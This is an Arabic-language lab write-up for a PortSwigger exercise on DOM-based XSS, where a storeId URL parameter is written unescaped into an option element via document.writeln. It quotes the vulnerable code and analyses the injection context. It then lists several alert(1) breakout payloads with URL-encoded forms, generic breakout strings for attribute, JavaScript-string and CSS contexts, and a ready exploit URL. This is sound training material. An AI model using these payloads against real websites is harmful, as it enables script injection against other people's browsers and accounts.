# [DOM XSS in `document.write` inside a `<select>` Element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
## 1. مقدمة

اللاب يحتوي على ثغرة **DOM-Based XSS** ناتجة عن استخدام:

```javascript
document.writeln
```

مع بيانات يتم أخذها مباشرة من:

```
location.search → storeId
```

القيمة يتم حقنها داخل عنصر **`<option>`** داخل **`<select>`**، وهذا يعطينا سياق HTML نقدر نكسره.

---

## 2. الكود الضعيف

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.writeln('<select name="storeId">');
if(store) {
    document.writeln('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.writeln('<option>'+stores[i]+'</option>');
}
document.writeln('</select>');
```

المتغير `store` يتم وضعه هنا:

```html
<option selected>USER_INPUT</option>
```

عشان ننفّذ XSS لازم نكسّر الـ `<option>` ونخرج برا `<select>`.

---

## 3. تحليل السياق (Context Analysis)

### أين يتم الحقن؟

- داخل **نص HTML**، وليس داخل attribute.
    
- داخل **عنصر مغلق** `<option> … </option>`.
    

### المطلوب لكسر السياق:

1. غلق `>` بعد `<option>`.
    
2. غلق `</option>`.
    
3. حقن سكربت.
    

---

## 4. الـ Payload

أنت استخدمت:

```
</option>';+<script>alert(1)</script>//
```

بعد الـ parsing يصبح فعّال لأن:

- `</option>` يغلق العنصر.
    
- يبدأ تنفيذ HTML جديد.
    
- `<script>alert(1)</script>` يتم تنفيذه.
    

**سبب نجاحه:**  
`document.write` لا يقوم بفلترة، والمحتوى خارج `<select>` يتم تفسيره كسكربت عادي.

---
## Payloads
### Payload 1 (قصير وواضح):

```
</option><script>alert(1)</script>
```

Encoded:

```
%3C%2Foption%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Payload 2 (يكسر خصائص HTML ويمنع الأخطاء):

```
"></option><script>alert(1)</script>
```

Encoded:

```
%22%3E%3C%2Foption%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Payload 3 (يستخدم تعليق HTML):

```
</option><!--><script>alert(1)</script>
```

### Payload 4 (للتأكد من الخروج من select):

```
</option></select><script>alert(1)</script>
```

---

## 6. كيف تكتشف النوع ده من الثغرات بنفسك؟

### خطوة 1 — دور على الـ sinks الخطيرة

الأشياء المعتادة:

- `innerHTML`
    
- `document.write`
    
- `outerHTML`
    
- jQuery: `.html()` / `$(...)` selectors
    

### خطوة 2 — شوف القيمة بتتحقن "فين"

اسأل نفسك:

- هل القيمة داخل HTML tag؟
    
- داخل نص؟
    
- داخل attribute؟
    
- داخل JavaScript string؟
    
- داخل CSS؟
    

### خطوة 3 — كل سياق له طريقة كسر مختلفة

#### **A) لو القيمة داخل HTML**

استخدم:

```
</tag><script>alert(1)</script>
```

#### **B) لو داخل attribute**

اكسر الـ quotes:

```
" onmouseover=alert(1) x="
```

#### **C) لو داخل JS string**

اكسر الـ string:

```
';alert(1);//
```

#### **D) لو داخل CSS**

```
</style><script>alert(1)</script>
```

### خطوة 4 — راقب الـ encoded output

لو لقيت `< > " ' /` بيتحولوا إلى `&lt;` أو `%3C` → لازم تبحث عن طريقة أخرى.

---

## 7. التنفيذ الفعلي (Final Exploit URL)

مثال جاهز يعمل على اللاب:

```
?storeId=%3C%2Foption%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

## 8. خلاصة

- XSS بيعتمد على فهم **السياق**.
    
- في اللاب ده، السياق كان **HTML داخل `<option>`**.
    
- أي طريقة تكسر العنصر وتضيف `<script>` ستنجح.
    